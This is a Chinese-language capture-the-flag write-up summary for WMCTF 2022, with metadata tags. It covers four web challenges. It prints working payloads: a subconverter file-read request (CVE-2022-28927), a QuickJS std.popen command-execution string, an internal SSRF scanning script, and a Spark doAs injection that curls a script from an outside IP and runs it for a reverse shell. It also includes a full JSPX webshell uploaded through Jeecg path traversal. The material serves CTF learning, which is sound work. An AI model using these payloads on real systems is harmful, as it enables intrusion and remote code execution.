---
title: 2022 WMCTF WP
contest: WMCTF 2022 (W & M CTF)
year: 2022
difficulty: hard
vuln_type: [lfi, ssrf, rce, web_unknown, sqli, auth_bypass]
tags: [CVE-2022-28927, subconverter, QuickJS, std.popen, SSRF-internal, Hadoop-Spark, doAs, K8s, Jeecg-boot, path-traversal, /toLogin.do/..;/]
attack_chain: ["Web subconverter: CVE-2022-28927 subconverter 任意文件读 pref.toml 拿 token", "QuickJS std.popen('/readflag > /app/flag1;/app/readflag > /app/flag2', 'r') JS 沙箱逃逸 RCE", "URL md5 文件名作为 script 路径 + token → /sub?url=script:cache/...&token=...&target=quanx", "Java: 扫内网 10.244.0.x:8080 找 Hadoop Spark", "POST /file doAs=;curl+http://.../>/tmp/1 URL 编码绕过", "再次 doAs=bash /tmp/1 反弹 shell", "nanoScore: /users 注册用户列表 + 默认密码 Ha1c9on/123456 拿 W&M 队账号", "easyjeecg: /toLogin.do/..;/jeecgFormDemoController.do?saveFiles 路径穿越 + JSPX webshell 上传"]
key_payload: "QuickJS: std.popen('/readflag > /app/flag1;/app/readflag > /app/flag2', 'r')"
one_liner: WMCTF 2022 4 大题：CVE-2022-28927+QuickJS+Hadoop SSRF+Jeecg path traversal
lesson: QuickJS std.popen 沙箱逃逸；Spark doAs URL 编码绕过；Jeecg 路径穿越 /..;/ 是经典
quality: high
---

# 2022 WMCTF WP

原文 https://www.ctfiot.com/53857.html

## Web

### subconverter (CVE-2022-28927)
```http
GET /convert?url=pref.toml
Host: 825bea31-5b59-4019-8696-d7cb2169156b.wmctf2022.wm-team.cn
```
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-28927
- 任意文件读拿 `pref.toml` 拿 token

**QuickJS std.popen 沙箱逃逸 RCE:**
```js
std.popen('/readflag > /app/flag1;/app/readflag > /app/flag2', 'r')
```
- `convert` 接口跑 JS 沙箱
- 用 std.popen 调外部命令

**触发 RCE:**
```http
GET /sub?url=script:cache/6ae41b39b6a858120a335aac90a2b032&token=P9MYKSRXgLhNe&target=quanx
```
- url 的 md5 是脚本缓存名
- token 拿自 pref.toml
- target=quanx 触发脚本执行

### Java SSRF
```python
# 扫内网 10.244.0.x:8080
for i in range(2, 255):
    burp0_url = "http://1.13.254.132:8080/file"
    burp0_data = {"url": f"http://10.244.0.{i}:8080", "Vcode": "skpz"}
    s = session.post(burp0_url, ...)
    if s.status_code == 200 and "spark://" in s.text:
        print(f"[!]{i}{s.text}")
```

**Hadoop Spark 命令注入:**
```http
POST /file
Content-Type: application/x-www-form-urlencoded

url=http://10.244.0.152:8080/?doAs=%253Bcurl%2Bhttp%253A%252F%252F120.26.59.137:8888/>/tmp/1&Vcode=skpz
```
- `doAs=` URL 双重编码
- 反向 shell 写 /tmp/1

```http
POST /file
url=http://10.244.0.152:8080/?doAs=%253Bbash%2B/tmp/1&Vcode=skpz
```
- 执行 bash /tmp/1 拿 shell

### nanoScore
- `/users` 暴露注册用户列表
- W&M 队用 `Ha1c9on/123456` 默认密码
- 登录拿 flag

### easyjeecg (Jeecg-boot)
```http
POST /toLogin.do/..;/jeecgFormDemoController.do?saveFiles
Content-Type: multipart/form-data; boundary=----WebKit...

------WebKitFormBoundary...
Content-Disposition: form-data; name="name"
8a8ab0b246dc81120146dc8181a60055
Content-Disposition: form-data; name="documentTitle"
1.jspx
Content-Disposition: form-data; name="file"; filename="1.jspx"
Content-Type: image/jpeg

<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" ...>
  <jsp:scriptlet><![CDATA[
    String tmp = pageContext.getRequest().getParameter("str");
    if (tmp != null && !"".equals(tmp)) {
      try {
        String str = new String((new BASE64Decoder()).decodeBuffer(tmp));
        Process p = Runtime.getRuntime().exec(tmp);
        InputStream in = p.getInputStream();
        BufferedReader br = new BufferedReader(new InputStreamReader(in, "GBK"));
        String brs = br.readLine();
        while (brs != null) {
          out.println(brs);
          brs = br.readLine();
        }
      } catch (Exception ex) { out.println(ex.toString()); }
    }
  ]]></jsp:scriptlet>
</jsp:root>
```
- **路径穿越 `/toLogin.do/..;/`** Spring 路由
- 上传 JSPX webshell

## 教学价值
- **CVE-2022-28927** subconverter LFI
- **QuickJS std.popen** 沙箱逃逸
- **Hadoop Spark doAs** URL 编码绕过（双重 + 单重）
- **Jeecg 路径穿越** `/toLogin.do/..;/jeecgFormDemoController.do`
- **HTTP SSRF 内网扫描** Python 自动化

## 工具
- subconverter / QuickJS
- pwntools
- yosocial Java 链
- Wireshark
